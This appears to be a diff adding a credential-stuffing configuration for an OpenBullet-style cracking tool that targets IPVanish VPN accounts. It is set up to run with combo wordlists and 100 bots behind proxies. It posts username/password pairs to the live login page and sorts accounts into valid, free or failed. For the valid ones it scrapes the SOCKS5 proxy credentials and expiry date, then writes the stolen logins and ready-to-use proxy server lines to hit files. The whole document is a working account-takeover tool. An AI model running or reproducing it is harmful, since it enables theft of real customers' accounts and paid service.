@@ -1,0 +1,127 @@
+[SETTINGS]
+{
+  "Name": "IPVanish Auto Proxy creator .Edited",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-07T19:56:35.6498286+04:30",
+  "AdditionalInfo": "",
+  "Author": "@krisvictor",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://account.ipvanish.com/login/validate" 
+  
+  HEADER "origin: https://account.ipvanish.com" 
+  HEADER "referer: https://account.ipvanish.com/login" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 124" 
+
+#tok PARSE "<SOURCE>" LR "name=\"clientToken\" id=\"clientToken\" value=\"" "\"/>" -> VAR "tok" 
+
+#Login REQUEST POST "https://account.ipvanish.com/login/validate" 
+  CONTENT "clientToken=<tok>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://account.ipvanish.com" 
+  HEADER "referer: https://account.ipvanish.com/login" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 124" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, your account credentials are invalid. Please try again." 
+  KEYCHAIN Retry OR 
+    KEY "We were unable to validate the captcha. Please check the box below to proceed with account login." 
+  KEYCHAIN Success OR 
+    KEY "class=\"profile_label\">Active</span>" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Update Billing Information" 
+  KEYCHAIN Ban OR 
+    KEY "your session has expired " 
+
+#Get REQUEST GET "https://account.ipvanish.com/index.php?t=SOCKS5%20Proxy" 
+  
+  HEADER "origin: https://account.ipvanish.com" 
+  HEADER "referer: https://account.ipvanish.com/login" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 124" 
+
+#Expire PARSE "<SOURCE>" LR "<script>document.cookie=\"vtype=2; expires=" ";" CreateEmpty=FALSE UseRegexLR=TRUE -> CAP "Expire" 
+
+#Username PARSE "<SOURCE>" LR "<p><b>Username:</b> " "</p>" CreateEmpty=FALSE -> CAP "Username" 
+
+#Password PARSE "<SOURCE>" LR "Password:</b> " "<br></p>" CreateEmpty=FALSE -> CAP "Password" 
+
+#SAVE UTILITY File "IPVANISH [Hits].txt" AppendLines "<USER>:<PASS> | Expire: <Expire> | Username: <Username> | Password: <Password>" -> CAP "SAVE" 
+
+#Socks5_ UTILITY File "IPVANISH [Socks5 Proxy].txt.txt" AppendLines "syd.socks.ipvanish.com:1080:<Username>:<Password>\\ngig.socks.ipvanish.com:1080:<Username>:<Password>\\ntor.socks.ipvanish.com:1080:<Username>:<Password>\\npar.socks.ipvanish.com:1080:<Username>:<Password>\\nfra.socks.ipvanish.com:1080:<Username>:<Password>\\nlin.socks.ipvanish.com:1080:<Username>:<Password>\\nnrt.socks.ipvanish.com:1080:<Username>:<Password>\\nams.socks.ipvanish.com:1080:<Username>:<Password>\\nwaw.socks.ipvanish.com:1080:<Username>:<Password>\\nlis.socks.ipvanish.com:1080:<Username>:<Password>\\nsin.socks.ipvanish.com:1080:<Username>:<Password>\\nmad.socks.ipvanish.com:1080:<Username>:<Password>\\nsto.socks.ipvanish.com:1080:<Username>:<Password>\\nlon.socks.ipvanish.com:1080:<Username>:<Password>\\niad.socks.ipvanish.com:1080:<Username>:<Password>\\natl.socks.ipvanish.com:1080:<Username>:<Password>\\nbos.socks.ipvanish.com:1080:<Username>:<Password>\\nclt.socks.ipvanish.com:1080:<Username>:<Password>\\nchi.socks.ipvanish.com:1080:<Username>:<Password>\\ndal.socks.ipvanish.com:1080:<Username>:<Password>\\nden.socks.ipvanish.com:1080:<Username>:<Password>\\nlax.socks.ipvanish.com:1080:<Username>:<Password>\\nmia.socks.ipvanish.com:1080:<Username>:<Password>\\nmsy.socks.ipvanish.com:1080:<Username>:<Password>\\nnyc.socks.ipvanish.com:1080:<Username>:<Password>\\nphx.socks.ipvanish.com:1080:<Username>:<Password>\\nsea.socks.ipvanish.com:1080:<Username>:<Password>\\n" -> CAP "Socks5" 
+
